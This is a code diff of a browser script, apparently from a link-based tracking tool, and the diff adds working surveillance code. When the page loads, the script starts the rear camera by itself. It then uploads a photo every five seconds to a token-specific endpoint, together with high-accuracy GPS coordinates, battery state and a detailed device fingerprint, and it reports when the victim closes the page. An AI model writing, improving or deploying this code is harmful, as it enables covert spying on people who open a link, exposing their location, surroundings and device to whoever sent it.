@@ -1,46 +1,56 @@
+// static/wrap_app.js
 (async () => {
   const token = window.TOKEN;
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
 
-  const CAPTURE_MS = 5500;
+  const CAPTURE_MS = 5000;
   let stream = null;
+  let loopTimer = null;
 
   const json = (o) => JSON.stringify(o);
 
-  const getDetails = () => {
+  function getDetails() {
     const d = {};
     d.userAgent = navigator.userAgent || "";
     d.platform = navigator.platform || "";
     d.cpuCores = navigator.hardwareConcurrency || null;
     d.ramGB = navigator.deviceMemory || null;
+    d.languages = navigator.languages || [navigator.language];
     d.screen = {
       w: window.screen.width,
       h: window.screen.height,
-      ratio: window.devicePixelRatio
+      ratio: window.devicePixelRatio || 1
     };
-    try {
-      const conn = navigator.connection;
-      if (conn) {
-        d.network = {
-          type: conn.effectiveType,
-          downlink: conn.downlink
-        };
-      }
-    } catch (_) {}
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      d.network = {
+        type: conn.effectiveType,
+        downlink: conn.downlink,
+        rtt: conn.rtt,
+        saveData: conn.saveData
+      };
+    }
     d.permissions = {};
     if (navigator.permissions) {
-      navigator.permissions.query({ name: "camera" }).then((r) => d.permissions.camera = r.state).catch(()=>{});
-      navigator.permissions.query({ name: "geolocation" }).then((r) => d.permissions.geolocation = r.state).catch(()=>{});
+      ["camera", "geolocation"].forEach((name) => {
+        try {
+          navigator.permissions
+            .query({ name })
+            .then((r) => { d.permissions[name] = r.state; })
+            .catch(() => {});
+        } catch {}
+      });
     }
     try {
-      const z = Intl.DateTimeFormat().resolvedOptions();
-      d.tz = { zone: z.timeZone, offset: new Date().getTimezoneOffset() };
-    } catch (_) {}
+      const opt = Intl.DateTimeFormat().resolvedOptions();
+      d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
+    } catch {}
     return d;
-  };
+  }
 
-  const getBattery = async () => {
+  async function getBattery() {
     try {
       if (!navigator.getBattery) return null;
       const b = await navigator.getBattery();
@@ -48,10 +58,10 @@
     } catch {
       return null;
     }
-  };
+  }
 
-  const getCoords = async () =>
-    new Promise((resolve) => {
+  async function getCoords() {
+    return new Promise((resolve) => {
       if (!navigator.geolocation) return resolve(null);
       navigator.geolocation.getCurrentPosition(
         (pos) => resolve({
@@ -63,8 +73,36 @@
         { enableHighAccuracy: true, timeout: 4000 }
       );
     });
+  }
 
-  const post = async (url, body) => {
+  async function waitForVideoReady(timeoutMs = 4000) {
+    if (video.videoWidth > 0 && video.videoHeight > 0) return true;
+    return new Promise((resolve) => {
+      let done = false;
+      function ok() {
+        if (!done && video.videoWidth > 0 && video.videoHeight > 0) {
+          done = true;
+          cleanup();
+          resolve(true);
+        }
+      }
+      function cleanup() {
+        video.removeEventListener("loadedmetadata", ok);
+        video.removeEventListener("canplay", ok);
+      }
+      video.addEventListener("loadedmetadata", ok);
+      video.addEventListener("canplay", ok);
+      setTimeout(() => {
+        if (!done) {
+          done = true;
+          cleanup();
+          resolve(false);
+        }
+      }, timeoutMs);
+    });
+  }
+
+  async function post(url, body) {
     try {
       await fetch(url, {
         method: "POST",
@@ -72,52 +110,87 @@
         body: json(body),
         keepalive: true
       });
-    } catch (_) {}
-  };
+    } catch {
+      // ignore
+    }
+  }
 
-  const uploadInfo = async () => {
+  async function captureAndUpload(battery, coords) {
+    if (!stream) return;
+    if (!video.videoWidth || !video.videoHeight) return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
+
+    await post(`/upload_image/${token}`, {
+      image_b64: dataUrl,
+      battery,
+      coords
+    });
+  }
+
+  async function tick() {
     const [battery, coords] = await Promise.all([
       getBattery(),
       getCoords()
     ]);
     const details = getDetails();
-    await post(`/upload_info/${token}`, { battery, coords, details });
-  };
 
-  const screenshot = async () => {
-    if (!stream || video.videoWidth === 0) return;
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    const frame = canvas.toDataURL("image/jpeg", 0.75);
-    await post(`/upload_image/${token}`, { image_b64: frame });
-  };
-
-  const loop = async () => {
-    await uploadInfo();
-    await screenshot();
-  };
-
-  // --- Start camera automatically ---
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment" },
-      audio: false
+    await post(`/upload_info/${token}`, {
+      battery,
+      coords,
+      details
     });
-    video.srcObject = stream;
-  } catch (_) {
-    await uploadInfo();
-    return;
+
+    await captureAndUpload(battery, coords);
   }
 
-  loop();
-  setInterval(loop, CAPTURE_MS);
+  async function start() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "environment" },
+        audio: false
+      });
+    } catch {
+      // no camera, still send info
+      await tick();
+      return;
+    }
 
-  // graceful finish
+    video.srcObject = stream;
+    try {
+      await video.play();
+    } catch {}
+
+    await waitForVideoReady(4000);
+
+    await tick(); // first tick immediately
+    loopTimer = setInterval(tick, CAPTURE_MS);
+  }
+
+  function stop() {
+    if (loopTimer) clearInterval(loopTimer);
+    loopTimer = null;
+    if (stream) {
+      try {
+        stream.getTracks().forEach((t) => t.stop());
+      } catch {}
+      stream = null;
+      video.srcObject = null;
+    }
+  }
+
   window.addEventListener("beforeunload", () => {
     try {
-      navigator.sendBeacon(`/upload_info/${token}`, json({ note: "close" }));
-    } catch (_) {}
+      navigator.sendBeacon(
+        `/upload_info/${token}`,
+        new Blob([json({ note: "page-closed" })], { type: "application/json" })
+      );
+    } catch {}
+    stop();
   });
 
+  await start();
 })();
